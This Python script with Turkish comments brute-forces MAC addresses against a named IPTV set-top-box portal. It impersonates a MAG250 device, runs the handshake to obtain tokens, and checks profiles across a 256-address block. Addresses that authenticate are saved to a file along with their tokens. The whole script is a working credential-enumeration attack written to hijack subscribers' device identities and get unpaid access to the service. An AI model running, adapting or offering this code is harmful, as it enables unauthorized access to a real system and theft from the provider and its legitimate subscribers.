import requests
import concurrent.futures
import json

# Portal API adresi
api_url = "http://dm.lion-ott.com/portal.php"

def derin_kontrol(mac):
    # Gerçek bir MAG cihazı gibi davranan başlıklar
    headers = {
        'User-Agent': 'MAG250',
        'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;',
        'Referer': 'http://dm.lion-ott.com/c/',
        'Connection': 'Keep-Alive'
    }

    try:
        # Adım 1: Handshake yaparak geçici Token almayı dene
        handshake_url = f"{api_url}?type=stb&action=handshake&token="
        response = requests.get(handshake_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            token = data.get('js', {}).get('token', '')
            
            if token:
                # Adım 2: Token ile profil bilgilerini (tarih vb.) çekmeyi dene
                profile_url = f"{api_url}?type=stb&action=get_profile&token={token}"
                profile_res = requests.get(profile_url, headers=headers, timeout=10)
                
                if profile_res.status_code == 200:
                    profile_data = profile_res.json()
                    # Eğer profil verisi geliyorsa, bu MAC %100 GERÇEKTİR
                    print(f"🔥 GERÇEK MAC BULDUM: {mac}")
                    return f"{mac} | DURUM: AKTIF | TOKEN: {token}"
    except:
        pass
    return None

def baslat():
    # Çalışan bloğun (00:1A:79:7C:6B) üzerinden 256 ihtimal
    base = "00:1A:79:7C:6B"
    mac_listesi = [f"{base}:{hex(i)[2:].zfill(2).upper()}" for i in range(256)]
    
    print(f"🚀 {len(mac_listesi)} adres için derin doğrulama başladı...")
    
    gercek_calisanlar = []
    # Sunucuyu yormadan 10 thread ile yavaş ve temiz tara
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        sonuclar = list(executor.map(derin_kontrol, mac_listesi))
        gercek_calisanlar = [s for s in sonuclar if s]

    with open("calisan_maclar.txt", "w") as f:
        if gercek_calisanlar:
            for m in gercek_calisanlar:
                f.write(f"http://dm.lion-ott.com/c/ | {m}\n")
            print(f"✅ {len(gercek_calisanlar)} adet GERÇEK çalışan bulundu.")
        else:
            f.write("Maalesef bu blokta doğrulanmış (Token alan) MAC bulunamadı.")
            print("😔 Doğrulanmış MAC bulunamadı.")

if __name__ == "__main__":
    baslat()
